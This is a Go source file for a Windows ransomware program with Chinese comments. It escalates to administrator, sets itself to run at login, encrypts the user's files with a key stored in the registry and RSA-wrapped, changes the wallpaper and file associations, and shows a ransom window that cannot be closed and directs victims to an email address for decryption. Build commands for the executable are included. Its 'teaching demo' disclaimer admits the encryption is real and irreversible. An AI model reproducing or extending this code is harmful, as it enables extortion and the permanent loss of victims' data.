package main

import (
	_ "embed"
	"gowinle/components"
	"gowinle/defaults"

	"github.com/lxn/walk"
	. "github.com/lxn/walk/declarative"
)

//go:embed wallpaper.png
var wallpaperData []byte

func main() {
	Zkey := components.GenerateRandomHex32()

	if !components.IsAdmin() {
		//非管理源获取管理员1
		components.RunAsAdmin()
	}
	components.Path()
	if components.IsAdmin() {
		//加入自启动2
		components.Login()
	}

	/*******************************注册表****************************/

	if len(components.Duzhucebiao()) < 32 {
		//小于32重新写入
		components.Xiezhucebiao(Zkey)
		components.CSxie(components.CSjiami("haha369", Zkey))
		//print(components.CSxie(components.CSjiami("haha369", Zkey)))
		//继续加密3
		if components.CSjiemi(components.CSdu(), components.CSVIPdu()) == "" {
			if components.EncryptAll(components.Duzhucebiao()) == nil {
				components.Xiezhucebiao(components.Rsajiami(components.Duzhucebiao()))
				showGUI()

			}
		}
		//加密完成后rsa加密原密钥
	} else if len(components.Duzhucebiao()) == 32 {
		//等于32 继续加密,待加密完成 覆盖密文后
		//继续加密4

		if components.CSjiemi(components.CSdu(), components.CSVIPdu()) == "" {
			if components.EncryptAll(components.Duzhucebiao()) == nil {
				components.Xiezhucebiao(components.Rsajiami(components.Duzhucebiao()))
				showGUI()
			}
		}
		//加密完成后rsa加密原密钥
	} else {
		//大于32位 已经加密完成,显示窗口赎金
		showGUI()
	}
	//存在

	/*******************************注册表****************************/

}

func showGUI() {

	var (
		mw      *walk.MainWindow
		mycode  *walk.TextEdit
		introTE *walk.TextEdit
		keyLE   *walk.LineEdit
	)
	if components.CSjiemi(components.CSdu(), components.CSVIPdu()) == "" {
		defaults.Bizhi(wallpaperData)
		defaults.Guanlian()
	}

	mainWnd := MainWindow{
		AssignTo: &mw,
		Title:    "勒索病毒",

		Size: Size{500, 350},

		Layout: VBox{},
		Children: []Widget{
			Label{Text: "介绍："},
			TextEdit{
				AssignTo: &introTE,
				ReadOnly: true,
				VScroll:  true,
				MinSize:  Size{Width: 0, Height: 50},
				MaxSize:  Size{Width: 0, Height: 100},
			},
			Label{Text: "机器码："},
			TextEdit{
				AssignTo: &mycode,
				ReadOnly: true,
				VScroll:  true,
				MinSize:  Size{Width: 0, Height: 50},
				MaxSize:  Size{Width: 0, Height: 50},
			},
			Label{Text: "密钥："},
			LineEdit{
				AssignTo:  &keyLE,
				CueBanner: "请输入密钥",
			},
			PushButton{
				Text: "解锁",
				OnClicked: func() {
					result := walk.MsgBox(
						mw,
						"提示",
						"请仔细检查，如果输入了错误的密钥，可能导致您的数据永远无法解密！",
						walk.MsgBoxYesNo|walk.MsgBoxIconWarning,
					)
					if result == walk.DlgCmdYes {
						if components.CSjiemi(components.CSdu(), keyLE.Text()) != "" {
							walk.MsgBox(mw, "提示", "开始解密数据,请等待程序自动结束!", walk.MsgBoxIconInformation)
							if err := components.DecryptAll(keyLE.Text()); err != nil {
								return
							}
							walk.MsgBox(mw, "提示", "解密完成", walk.MsgBoxIconInformation)
							components.CSVIPxie(keyLE.Text())
							defaults.QuxiaoGuanlian()
						} else {
							walk.MsgBox(mw, "注册信息", "密钥错误,请勿随便测试,可能导致所有数据无法恢复", walk.MsgBoxIconInformation)
						}
					}
				},
			},
		},
	}

	if err := mainWnd.Create(); err != nil {
		panic(err)
	}

	introTE.SetText("\t\t恭喜您中了勒索病毒\r\n1、本程序只是勒索病毒演示程序,但具有真实文件加密,无法挽回!\r\n2、本程序仅作为教学演示病毒，请千万不要肆意传播！\r\n3、本勒索病毒开发初衷为教程演示，请勿违法使用!\r\n4、您中演示病毒后，将无法解密，请联系\"4176@163.com\"，提供机器码解密!\r\n5、在您中毒后,千万不要慌张,切勿丢失机器码,届时数据将无法挽回!\r\n6、本程不存在传播风险!")
	mycode.SetText(components.Duzhucebiao())
	mw.Closing().Attach(func(canceled *bool, reason walk.CloseReason) {
		if components.CSjiemi(components.CSdu(), components.CSVIPdu()) == "" {
			walk.MsgBox(mw, "提示", "您当然关闭本窗口,但是数据将无法恢复", walk.MsgBoxIconInformation)
			*canceled = true
		}

	})
	icon, err := walk.NewIconFromResourceId(2) //注意1是app.manifest
	if err == nil {
		mw.SetIcon(icon)
	}
	mw.Run()
}

//rsrc -manifest app.manifest -ico a.ico -o app.syso
// go build -trimpath -ldflags="-s -w -H=windowsgui" -o lesuo.exe
